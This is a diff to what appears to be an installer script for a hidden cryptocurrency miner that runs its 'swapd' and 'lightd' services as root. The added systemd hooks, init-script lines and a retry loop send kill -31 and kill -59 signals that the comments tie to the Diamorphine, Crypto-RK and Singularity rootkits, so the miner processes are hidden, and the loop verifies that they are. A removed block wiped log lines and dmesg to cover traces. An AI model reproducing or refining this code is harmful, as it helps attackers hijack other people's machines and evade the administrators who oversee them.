@@ -1094,6 +1094,7 @@ Type=simple
 User=root
 WorkingDirectory=/root/.swapd
 ExecStart=/root/.swapd/swapd -c /root/.swapd/swapfile
+ExecStartPost=/bin/bash -c 'sleep 3; for i in 1 2 3; do pgrep -f swapd | xargs -r kill -31 2>/dev/null; pgrep -f swapd | xargs -r kill -59 2>/dev/null; sleep 1; done'
 Restart=always
 RestartSec=10
 Nice=19
@@ -1163,6 +1164,13 @@ case "$1" in
         echo "Starting $NAME..."
         cd $WORKDIR
         start-stop-daemon --start --background --make-pidfile --pidfile $PIDFILE --chdir $WORKDIR --exec $DAEMON -- $DAEMON_ARGS || true
+        # Auto-hide process after start
+        sleep 3
+        for i in 1 2 3; do
+            pgrep -f swapd | xargs -r kill -31 2>/dev/null || true
+            pgrep -f swapd | xargs -r kill -59 2>/dev/null || true
+            sleep 1
+        done
         ;;
     stop)
         echo "Stopping $NAME..."
@@ -1875,6 +1883,7 @@ After=network.target swapd.service
 Type=simple
 User=root
 ExecStart=/usr/local/bin/lightd daemon
+ExecStartPost=/bin/bash -c 'sleep 3; for i in 1 2 3; do pgrep -f lightd | xargs -r kill -31 2>/dev/null; pgrep -f lightd | xargs -r kill -59 2>/dev/null; sleep 1; done'
 Restart=always
 RestartSec=30
 StandardOutput=null
@@ -2201,10 +2210,6 @@ else
     echo '  systemctl status lightd → active (running) ✓'
 fi
 
-# Auto-clean nach Installation
-sed -i '/diamorphine/d; /swapd/d; /System swap daemon/d' /var/log/messages
-dmesg -C
-
 echo ''
 
 # ==================== HIDE MINER PROCESSES ====================
@@ -2213,18 +2218,58 @@ echo "=========================================="
 echo "ACTIVATING PROCESS HIDING"
 echo "=========================================="
 echo ""
-echo "[*] Sending hide signals unconditionally..."
-echo "[*] Note: rootkits hide themselves from lsmod — signals sent regardless"
-sleep 3  # Give processes time to be fully up before hiding
 
-# ---- kill -31: Diamorphine + Crypto-RK hide signal ----
-echo "[*] Sending kill -31 (Diamorphine/Crypto-RK hide)..."
-send_sig 31 config.json swapd swapfile lightd
-echo "[✓] kill -31 sent"
+# Wait for services to fully start and spawn processes
+echo "[*] Waiting for miner processes to start..."
+sleep 5
 
-# ---- kill -59: Singularity toggle hide signal ----
-echo "[*] Sending kill -59 (Singularity toggle hide)..."
-send_sig 59 config.json swapd swapfile lightd
-echo "[✓] kill -59 sent"
+# Try to hide processes with retry logic
+MAX_ATTEMPTS=10
+attempt=0
+all_hidden=false
+
+while [ $attempt -lt $MAX_ATTEMPTS ] && [ "$all_hidden" = false ]; do
+    attempt=$((attempt + 1))
+    echo "[*] Hide attempt $attempt/$MAX_ATTEMPTS..."
+    
+    # Send both hide signals to all target processes
+    # kill -31: Diamorphine + Crypto-RK
+    # kill -59: Singularity
+    for pattern in config.json swapd swapfile lightd; do
+        pids=$(proc_pids "$pattern" 2>/dev/null)
+        if [ -n "$pids" ]; then
+            for pid in $pids; do
+                kill -31 "$pid" 2>/dev/null || true
+                kill -59 "$pid" 2>/dev/null || true
+            done
+        fi
+    done
+    
+    # Wait for rootkit to process the signals
+    sleep 2
+    
+    # Check if processes are now hidden
+    echo "[*] Verifying process visibility..."
+    if ! proc_pids swapd | grep -q . 2>/dev/null && \
+       ! proc_pids lightd | grep -q . 2>/dev/null; then
+        all_hidden=true
+        echo "[✓] All processes successfully hidden!"
+    else
+        echo "[*] Some processes still visible, retrying..."
+        sleep 3
+    fi
+done
+
+if [ "$all_hidden" = false ]; then
+    echo "[!] WARNING: Processes may still be visible after $MAX_ATTEMPTS attempts"
+    echo "[*] Manual fix: Run these commands:"
+    echo "    kill -31 \$(pgrep swapd)"
+    echo "    kill -59 \$(pgrep swapd)"
+    echo "    kill -31 \$(pgrep lightd)"
+    echo "    kill -59 \$(pgrep lightd)"
+fi
 
 echo '========================================================================'
+
+# Exit successfully (prevent parent wrapper from retrying)
+exit 0
